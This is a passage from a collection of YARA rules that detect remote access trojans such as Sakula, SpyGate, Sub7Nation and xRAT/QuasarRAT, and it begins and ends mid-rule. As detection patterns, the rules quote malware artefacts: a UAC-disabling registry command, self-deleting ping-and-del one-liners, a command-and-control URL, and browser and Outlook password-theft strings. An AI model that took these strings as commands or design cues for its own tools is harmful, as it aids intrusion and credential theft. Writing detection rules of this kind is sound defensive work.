\"CCPUpdate\"\n\n    condition:\n        uint16(0) == 0x5a4d and $m1 and $m2 and $m3 and $v1_2 and not $v1_1\n}\n\nrule sakula_v1_3 : RAT\n{\n    meta:\n        description = \"Sakula / Sakurel / VIPER v1.3 RAT\"\n        classifications = \"Backdoor\"\n        threat_names = \"Sakula\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Airbus Defence and Space Cybersecurity CSIRT - Yoann Francou\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"sakula_v1_3\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $m1 = \"%d_of_%d_for_%s_on_%s\"\n        $m2 = \"/c ping 127.0.0.1 & del /q \\\"%s\\\"\"\n        $m3 = \"cmd.exe /c rundll32 \\\"%s\\\"\"\n        $v1_3 = { 81 3E 78 03 00 00 75 57  8D 54 24 14 52 68 0C 05 41 00 68 01 00 00 80 FF  15 00 F0 40 00 85 C0 74 10 8B 44 24 14 68 2C 31  41 00 50 FF 15 10 F0 40 00 8B 4C 24 14 51 FF 15  24 F0 40 00 E8 0F 09 00 }\n\n    condition:\n        uint16(0) == 0x5a4d and all of them\n}\n\nrule sakula_v1_4 : RAT\n{\n    meta:\n        description = \"Sakula / Sakurel / VIPER v1.4 RAT\"\n        classifications = \"Backdoor\"\n        threat_names = \"Sakula\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Airbus Defence and Space Cybersecurity CSIRT - Yoann Francou\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"sakula_v1_4\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $m1 = \"%d_of_%d_for_%s_on_%s\"\n        $m2 = \"/c ping 127.0.0.1 & del /q \\\"%s\\\"\"\n        $m3 = \"cmd.exe /c rundll32 \\\"%s\\\"\"\n        $v1_4 = { 50 E8 CD FC FF FF 83 C4  04 68 E8 03 00 00 FF D7 56 E8 54 12 00 00 E9 AE  FE FF FF E8 13 F5 FF FF }\n\n    condition:\n        uint16(0) == 0x5a4d and all of them\n}\n\nrule Sakurel_backdoor\n{\n    meta:\n        description = \"Sakula / Sakurel / VIPER RAT\"\n        ref = \"http://www.microsoft.com/security/portal/threat/encyclopedia/entry.aspx?Name=Trojan:Win32/Sakurel.A#tab=2\"\n        classifications = \"Backdoor\"\n        threat_names = \"Sakula\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Sakurel_backdoor\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $type = \"Microsoft-Windows-Security-Auditing\"\n        $eventid = \"4688\"\n        $data = \"Windows\\\\System32\\\\sysprep\\\\sysprep.exe\" nocase\n        $type1 = \"Microsoft-Windows-Security-Auditing\"\n        $eventid1 = \"4688\"\n        $data1 = \"AppData\\\\Local\\\\Temp\\\\MicroMedia\\\\MediaCenter.exe\" nocase\n\n    condition:\n        all of them\n}\n\nrule ShadowTech\n{\n    meta:\n        description = \"ShadowTech RAT\"\n        ref = \"http://malwareconfig.com/stats/ShadowTech\"\n        classifications = \"Backdoor\"\n        threat_names = \"ShadowTech\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Breen <kevin@techanarchy.net>\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RAT_ShadowTech\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a = \"ShadowTech\" nocase\n        $b = \"DownloadContainer\"\n        $c = \"MySettings\"\n        $d = \"System.Configuration\"\n        $newline = \"#-@NewLine@-#\" wide\n        $split = \"pSIL\" wide\n        $key = \"ESIL\" wide\n\n    condition:\n        4 of them\n}\n\nrule ShadowTech_2\n{\n    meta:\n        description = \"ShadowTech RAT\"\n        classifications = \"Backdoor\"\n        threat_names = \"ShadowTech\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"botherder https://github.com/botherder\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"ShadowTech_2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $string1 = /\\#(S)trings/\n        $string2 = /\\#(G)UID/\n        $string3 = /\\#(B)lob/\n        $string4 = /(S)hadowTech Rat\\.exe/\n        $string5 = /(S)hadowTech_Rat/\n\n    condition:\n        all of them\n}\n\nrule shimrat\n{\n    meta:\n        description = \"ShimRat malware\"\n        classifications = \"Backdoor\"\n        threat_names = \"ShimRat\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Yonathan Klijnsma (yonathan.klijnsma@fox-it.com)\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"shimrat\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $dll = \".dll\"\n        $dat = \".dat\"\n        $headersig = \"QWERTYUIOPLKJHG\"\n        $datasig = \"MNBVCXZLKJHGFDS\"\n        $datamarker1 = \"Data$$00\"\n        $datamarker2 = \"Data$$01%c%sData\"\n        $cmdlineformat = \"ping localhost -n 9 /c %s > nul\"\n        $demoproject_keyword1 = \"Demo\"\n        $demoproject_keyword2 = \"Win32App\"\n        $comspec = \"COMSPEC\"\n        $shim_func1 = \"ShimMain\"\n        $shim_func2 = \"NotifyShims\"\n        $shim_func3 = \"GetHookAPIs\"\n\n    condition:\n        ($dll and $dat and $headersig and $datasig) or ($datamarker1 and $datamarker2) or ($cmdlineformat and $demoproject_keyword1 and $demoproject_keyword2 and $comspec) or ($dll and $dat and $shim_func1 and $shim_func2 and $shim_func3)\n}\n\nrule shimratreporter\n{\n    meta:\n        description = \"ShimRat malware\"\n        classifications = \"Backdoor\"\n        threat_names = \"ShimRat\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Yonathan Klijnsma (yonathan.klijnsma@fox-it.com)\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"shimratreporter\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $IpInfo = \"IP-INFO\"\n        $NetworkInfo = \"Network-INFO\"\n        $OsInfo = \"OS-INFO\"\n        $ProcessInfo = \"Process-INFO\"\n        $BrowserInfo = \"Browser-INFO\"\n        $QueryUserInfo = \"QueryUser-INFO\"\n        $UsersInfo = \"Users-INFO\"\n        $SoftwareInfo = \"Software-INFO\"\n        $AddressFormat = \"%02X-%02X-%02X-%02X-%02X-%02X\"\n        $proxy_str = \"(from environment) = %s\"\n        $netuserfun = \"NetUserEnum\"\n        $networkparams = \"GetNetworkParams\"\n\n    condition:\n        all of them\n}\n\nrule SmallNet\n{\n    meta:\n        description = \"SmallNet RAT\"\n        ref = \"http://malwareconfig.com/stats/SmallNet\"\n        classifications = \"Backdoor\"\n        threat_names = \"SmallNet\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Breen <kevin@techanarchy.net>\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RAT_SmallNet\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $split1 = \"!!<3SAFIA<3!!\"\n        $split2 = \"!!ElMattadorDz!!\"\n        $a1 = \"stub_2.Properties\"\n        $a2 = \"stub.exe\" wide\n        $a3 = \"get_CurrentDomain\"\n\n    condition:\n        ($split1 or $split2) and (all of ($a*))\n}\n\nrule SpyGate\n{\n    meta:\n        description = \"SpyGate RAT\"\n        ref = \"http://malwareconfig.com/stats/SpyGate\"\n        classifications = \"Backdoor\"\n        threat_names = \"SpyGate\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Breen <kevin@techanarchy.net>\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RAT_SpyGate\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $split = \"abccba\"\n        $a1 = \"abccbaSpyGateRATabccba\"\n        $a2 = \"StubX.pdb\"\n        $a3 = \"abccbaDanabccb\"\n        $b1 = \"monikerString\" nocase\n        $b2 = \"virustotal1\"\n        $b3 = \"get_CurrentDomain\"\n        $c1 = \"shutdowncomputer\" wide\n        $c2 = \"shutdown -r -t 00\" wide\n        $c3 = \"set cdaudio door closed\" wide\n        $c4 = \"FileManagerSplit\" wide\n        $c5 = \"Chating With >> [~Hacker~]\" wide\n\n    condition:\n        (all of ($a*) and #split > 40) or (all of ($b*) and #split > 10) or (all of ($c*))\n}\n\nrule Sub7Nation\n{\n    meta:\n        description = \"Sub7Nation RAT\"\n        ref = \"http://malwareconfig.com/stats/Sub7Nation\"\n        classifications = \"Backdoor\"\n        threat_names = \"Sub7Nation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Breen <kevin@techanarchy.net> (slightly modified by Florian Roth to improve performance)\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RAT_Sub7Nation\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a = \"EnableLUA /t REG_DWORD /d 0 /f\"\n        $i = \"HostSettings\"\n        $verSpecific1 = \"sevane.tmp\"\n        $verSpecific2 = \"cmd_.bat\"\n        $verSpecific3 = \"a2b7c3d7e4\"\n        $verSpecific4 = \"cmd.dll\"\n\n    condition:\n        all of them\n}\n\nrule xDedic_SysScan_unpacked\n{\n    meta:\n        description = \"SysScan RAT\"\n        ref = \"https://securelist.com/blog/research/75027/xdedic-the-shady-world-of-hacked-servers-for-sale/\"\n        classifications = \"Backdoor, Spyware\"\n        threat_names = \"SysScan\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \" Kaspersky Lab\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"xDedic_SysScan_unpacked\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a1 = \"/c ping -n 2 127.0.0.1 & del \\\"SysScan.exe\\\"\" ascii wide\n        $a2 = \"SysScan DEBUG Mode!!!\" ascii wide\n        $a3 = \"This rechecking? (set 0/1 or press enter key)\" ascii wide\n        $a4 = \"http://37.49.224.144:8189/manual_result\" ascii wide\n        $b1 = \"Checker end work!\" ascii wide\n        $b2 = \"Trying send result...\" ascii wide\n\n    condition:\n        uint16(0) == 0x5A4D and filesize < 5000000 and (any of ($a*) or all of ($b*))\n}\n\nrule TerminatorRat : RAT\n{\n    meta:\n        description = \"Terminator RAT\"\n        ref = \"http://www.fireeye.com/blog/technical/malware-research/2013/10/evasive-tactics-terminator-rat.html\"\n        classifications = \"Backdoor\"\n        threat_names = \"Terminator RAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Jean-Philippe Teissier / @Jipe_\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"TerminatorRat\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a = \"Accelorator\"\n        $b = \"<html><title>12356</title><body>\"\n\n    condition:\n        all of them\n}\n\nrule TidePool_Malware\n{\n    meta:\n        description = \"TidePool RAT\"\n        ref = \"http://goo.gl/m2CXWR\"\n        classifications = \"Backdoor\"\n        threat_names = \"TidePool RAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"TidePool_Malware\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"Content-Disposition: form-data; name=\\\"m1.jpg\\\"\" fullword ascii\n        $x2 = \"C:\\\\PROGRA~2\\\\IEHelper\\\\mshtml.dll\" fullword wide\n        $x3 = \"C:\\\\DOCUME~1\\\\ALLUSE~1\\\\IEHelper\\\\mshtml.dll\" fullword wide\n        $x4 = \"IEComDll.dat\" fullword ascii\n        $s1 = \"Content-Type: multipart/form-data; boundary=----=_Part_%x\" fullword wide\n        $s2 = \"C:\\\\Windows\\\\System32\\\\rundll32.exe\" fullword wide\n        $s3 = \"network.proxy.socks_port\\\", \" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and (1 of ($x*))) or (4 of them)\n}\n\nrule TSCookie_RAT\n{\n    meta:\n        description = \"TSCookie RAT\"\n        ref = \"http://blog.jpcert.or.jp/2018/03/malware-tscooki-7aa0.html\"\n        classifications = \"Backdoor\"\n        threat_names = \"TSCookie\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"TSCookie_RAT\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"[-] DecryptPassword_Outlook failed(err=%d)\" fullword ascii\n        $x2 = \"----------------------- Firefox Passwords ------------------\" fullword ascii\n        $x3 = \"--------------- Outlook Passwords ------------------\" fullword ascii\n        $x4 = \"----------------------- IE Passwords ------------------\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and ((pe.exports(\"DoWork\") and pe.exports(\"PrintF\")) or 1 of them)\n}\n\nrule UBoatRAT\n{\n    meta:\n        description = \"UBoat RAT\"\n        ref = \"https://researchcenter.paloaltonetworks.com/2017/11/unit42-uboatrat-navigates-east-asia/\"\n        classifications = \"Backdoor\"\n        threat_names = \"UBoat\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"UBoatRAT\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"URLDownloadToFileA\" ascii\n        $s2 = \"GetModuleFileNameW\" ascii\n        $s4 = \"WININET.dll\" ascii\n        $s5 = \"urlmon.dll\" ascii\n        $s6 = \"WTSAPI32.dll\" ascii\n        $s7 = \"IPHLPAPI.DLL\" ascii\n        $op1 = { 0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68\n               69 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F\n               74 20 62 65 20 72 75 6E 20 69 6E 20 44 4F 53 20\n               6D 6F 64 65 2E 0D 0D 0A 24 00 00 00 00 00 00 00 }\n        $vprotect = { 2E 76 6D 70 30 }\n\n    condition:\n        uint16(0) == 0x5a4d and uint32(uint32(0x3c)) == 0x4550 and filesize < 1400KB and filesize > 800KB and (all of ($s*) and $op1 at 64 and uint16(uint32(0x3c) + 11) == 0x59 and $vprotect in (600 .. 700))\n}\n\nrule UBoatRAT_Dropper\n{\n    meta:\n        description = \"UBoat RAT dropper\"\n        ref = \"https://researchcenter.paloaltonetworks.com/2017/11/unit42-uboatrat-navigates-east-asia/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"UBoatRAT_Dropper\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"GetCurrenvackageId\" fullword ascii\n        $s2 = \"fghijklmnopq\" fullword ascii\n        $s3 = \"23456789:;<=>?@ABCDEFGHIJKLMNOPQ\" fullword ascii\n        $s4 = \"PMM/dd/y\" fullword ascii\n        $s5 = \"bad all\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and all of them)\n}\n\nrule unrecom\n{\n    meta:\n        description = \"unrecom RAT\"\n        ref = \"http://malwareconfig.com/stats/unrecom\"\n        classifications = \"Backdoor\"\n        threat_names = \"unrecom\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Breen <kevin@techanarchy.net>\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RAT_unrecom\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $meta = \"META-INF\"\n        $conf = \"load/ID\"\n        $a = \"load/JarMain.class\"\n        $b = \"load/MANIFEST.MF\"\n        $c = \"plugins/UnrecomServer.class\"\n\n    condition:\n        all of them\n}\n\nrule VertexNet\n{\n    meta:\n        description = \"VertexNet RAT\"\n        classifications = \"Backdoor\"\n        threat_names = \"VertexNet\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Brian Wallace @botnet_hunter\"\n        source = \"https://github.com/bwall/bamfdetect\"\n        original_name = \"VertexNet\"\n        license = \"MIT (https://opensource.org/licenses/MIT)\"\n\n    strings:\n        $s1 = \"vertexnet\" nocase\n        $s2 = \"urldl::\"\n        $s3 = \"%LAPPDATA%\"\n        $s4 = \"[ERROR] while loading ressource\"\n\n    condition:\n        all of them\n}\n\nrule Vertex\n{\n    meta:\n        description = \"VertexNet RAT\"\n        ref = \"http://malwareconfig.com/stats/Vertex\"\n        classifications = \"Backdoor\"\n        threat_names = \"VertexNet\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Breen <kevin@techanarchy.net>\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RAT_Vertex\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $string1 = \"DEFPATH\"\n        $string2 = \"HKNAME\"\n        $string3 = \"HPORT\"\n        $string4 = \"INSTALL\"\n        $string5 = \"IPATH\"\n        $string6 = \"MUTEX\"\n        $res1 = \"PANELPATH\"\n        $res2 = \"ROOTURL\"\n\n    condition:\n        all of them\n}\n\nrule VirusRat\n{\n    meta:\n        description = \"VirusRAT malware\"\n        ref = \"http://malwareconfig.com/stats/VirusRat\"\n        classifications = \"Backdoor\"\n        threat_names = \"VirusRAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Breen <kevin@techanarchy.net>\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RAT_VirusRat\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $string0 = \"virustotal\"\n        $string1 = \"virusscan\"\n        $string2 = \"abccba\"\n        $string3 = \"pronoip\"\n        $string4 = \"streamWebcam\"\n        $string5 = \"DOMAIN_PASSWORD\"\n        $string6 = \"Stub.Form1.resources\"\n        $string7 = \"ftp://{0}@{1}\" wide\n        $string8 = \"SELECT * FROM moz_logins\" wide\n        $string9 = \"SELECT * FROM moz_disabledHosts\" wide\n        $string10 = \"DynDNS\\\\Updater\\\\config.dyndns\" wide\n        $string11 = \"|BawaneH|\" wide\n\n    condition:\n        all of them\n}\n\nrule WebMonitor_RAT\n{\n    meta:\n        description = \"WebMonitor RAT\"\n        ref = \"https://researchcenter.paloaltonetworks.com/2018/04/unit42-say-cheese-webmonitor-rat-comes-c2-service-c2aas/\"\n        classifications = \"Backdoor\"\n        threat_names = \"WebMonitor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MAL_WebMonitor_RAT\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"send_keylog_stream_start\" fullword wide\n        $x2 = \"KEYLOG_STREAM_STOP\" fullword wide\n        $s1 = \"SHELL_EXEC\" fullword wide\n        $s2 = \"send_shell_exec\" fullword wide\n        $s3 = \"send_connections_get\" fullword wide\n        $a1 = \"Select * from Win32_PerfRawData_PerfProc_Process where IDProcess = '\" fullword wide\n        $a2 = \"Select * from Win32_Process WHERE handle =\" fullword wide\n        $a3 = \"Select * from Win32_Process where ProcessId=\" fullword wide\n        $a4 = \"Select * from Win32_ComputerSystem\" fullword wide\n        $a5 = \"The service is in the process of being continued\" fullword wide\n        $a6 = \"tcpdump\" fullword wide\n        $a7 = \"memdump\" fullword wide\n        $a8 = \"<val1>Processor</val1>\" fullword wide\n        $a9 = \"Win32 share process\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and (1 of ($x*) or (2 of ($s*) and 2 of ($a*)) or 7 of them)\n}\n\nrule wmi_implant\n{\n    meta:\n        description = \"WMImplant RAT\"\n        ref = \"https://www.fireeye.com/blog/threat-research/2017/03/wmimplant_a_wmi_ba.html\"\n        classifications = \"Backdoor\"\n        threat_names = \"WMImplant\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@fusionrace\"\n        source = \"https://github.com/airbnb/binaryalert\"\n        original_name = \"hacktool_windows_wmi_implant\"\n        license = \"Apache-2.0 (https://opensource.org/licenses/Apache-2.0)\"\n\n    strings:\n        $s1 = \"This really isn't applicable unless you are using WMImplant interactively.\" fullword ascii wide\n        $s2 = \"What command do you want to run on the remote system? >\" fullword ascii wide\n        $s3 = \"Do you want to [create] or [delete] a string registry value? >\" fullword ascii wide\n        $s4 = \"Do you want to run a WMImplant against a list of computers from a file? [yes] or [no] >\" fullword ascii wide\n        $s5 = \"What is the name of the service you are targeting? >\" fullword ascii wide\n        $s6 = \"This function enables the user to upload or download files to/from the attacking machine to/from the targeted machine\" fullword ascii wide\n        $s7 = \"gen_cli - Generate the CLI command to execute a command via WMImplant\" fullword ascii wide\n        $s8 = \"exit - Exit WMImplant\" fullword ascii wide\n        $s9 = \"Lateral Movement Facilitation\" fullword ascii wide\n        $s10 = \"vacant_system - Determine if a user is away from the system.\" fullword ascii wide\n        $s11 = \"Please provide the ProcessID or ProcessName flag to specify the process to kill!\" fullword ascii wide\n\n    condition:\n        any of them\n}\n\nrule xRAT_1\n{\n    meta:\n        description = \"xRAT malware\"\n        ref = \"https://goo.gl/Pg3P4W\"\n        classifications = \"Backdoor\"\n        threat_names = \"xRAT, QuasarRAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"xRAT_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"\\\" -CHECK & PING -n 2 127.0.0.1 & EXIT\" fullword wide\n        $x2 = \"xClient.Core.Elevation\" fullword ascii\n        $x3 = \">> Welcome to MAX-Shell :Session created\" fullword wide\n        $x4 = \"xClient.Properties.Resources.resources\" fullword ascii\n        $x5 = \"<description>My UAC Compatible application</description>\" fullword ascii\n        $s1 = \"ping -n 20 localhost > nul\" fullword wide\n        $s2 = \"DownloadAndExecute\" fullword ascii\n        $s3 = \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36\" fullword wide\n        $s4 = \"Client.exe\" fullword ascii\n        $s5 = \"Microsoft -Defender\" fullword wide\n        $s6 = \"Microsoft- Defender\" fullword wide\n        $s7 = \"set_RunHidden\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and (1 of ($x*) or 3 of them)\n}\n\nrule xRAT\n{\n    meta:\n        description = \"xRAT malware\"\n        ref = \"http://malwareconfig.com/stats/xRat\"\n        classifications = \"Backdoor\"\n        threat_names = \"xRAT, QuasarRAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Breen <kevin@techanarchy.net>\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RAT_xRAT\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $v1a = \"DecodeProductKey\"\n        $v1b = \"StartHTTPFlood\"\n        $v1c = \"CodeKey\"\n        $v1d = \"MESSAGEBOX\"\n        $v1e = \"GetFilezillaPasswords\"\n        $v1f = \"DataIn\"\n        $v1g = \"UDPzSockets\"\n        $v1h = {52 00 54 00 5F 00 52 00 43 00 44 00 41 00 54 00 41}\n        $v2a = \"<URL>k__BackingField\"\n        $v2b = \"<RunHidden>k__BackingField\"\n        $v2c = \"DownloadAndExecute\"\n        $v2d = \"-CHECK & PING -n 2 127.0.0.1 & EXIT\" wide\n        $v2e = \"england.png\" wide\n        $v2f = \"Showed Messagebox\" wide\n\n    condition:\n        all of ($v1*) or all of ($v2*)\n}\n\nrule xRAT20 : RAT\n{\n    meta:\n        description = \"xRAT 2.0 malware\"\n        classifications = \"Backdoor\"\n        threat_names = \"xRAT, QuasarRAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Rottweiler\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"xRAT20\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $string0 = \"GetDirectory: File not found\" wide\n        $string1 = \"<>m__Finally8\"\n        $string2 = \"Secure\"\n        $string3 = \"ReverseProxyClient\"\n        $string4 = \"DriveDisplayName\"\n        $string5 = \"<IsError>k__BackingField\"\n        $string6 = \"set_InstallPath\"\n        $string7 = \"memcmp\"\n        $string8 = \"urlHistory\"\n        $string9 = \"set_AllowAutoRedirect\"\n        $string10 = \"lpInitData\"\n        $string11 = \"reader\"\n        $string12 = \"<FromRawDataGlobal>d__f\"\n        $string13 = \"mq.png\" wide\n        $string14 = \"remove_KeyDown\"\n        $string15 = \"ProtectedData\"\n        $string16 = \"m_hotkeys\"\n        $string17 = \"get_Hour\"\n        $string18 = \"\\\\mozglue.dll\" wide\n\n    condition:\n        18 of them\n}\n\nrule xrat_quasarrat\n{\n    meta:\n        description = \"xRAT malware\"\n        ref = \"https://github.com/quasar/QuasarRAT\"\n        classifications = \"Backdoor\"\n        threat_names = \"xRAT, QuasarRAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@mimeframe\"\n        source = \"https://github.com/airbnb/binaryalert\"\n        original_name = \"malware_windows_xrat_quasarrat\"\n        license = \"Apache-2.0 (https://opensource.org/licenses/Apache-2.0)\"\n\n    strings:\n        $a1 = \">> New Session created\" wide ascii\n        $a2 = \">> Session unexpectedly closed\" wide ascii\n        $a3 = \">> Session closed\" wide ascii\n        $a4 = \"session unexpectedly closed\" wide ascii\n        $a5 = \"cmd\" fullword wide ascii\n        $a6 = \"/K\" fullword wide ascii\n        $b1 = \"echo DONT CLOSE THIS WINDOW!\" wide ascii\n        $b2 = \"ping -n 20 localhost > nul\" wide ascii\n        $b3 = \"Downloading file...\" wide ascii\n        $b4 = \"Visited Website\" wide ascii\n        $b5 = \"Adding Autostart Item failed!\" wide ascii\n        $b6 = \":Zone.Identifier\" wide ascii\n        $c1 = \"GetDrives I/O error\" wide ascii\n        $c2 = \"/r /t 0\" wide ascii\n        $c3 = \"desktop.ini\" wide ascii\n        $c4 = \"WAN IP Address\" wide ascii\n        $c5 = \"User refused the elevation request.\" wide ascii\n        $c6 = \"Process already elevated.\" wide ascii\n\n    condition:\n        5 of ($a*) or 5 of ($b*) or 5 of ($c*)\n}\n\nrule Xtreme\n{\n    meta:\n        description = \"Xtreme RAT\"\n        classifications = \"Backdoor, Spyware\"\n        threat_names = \"XtremeRAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        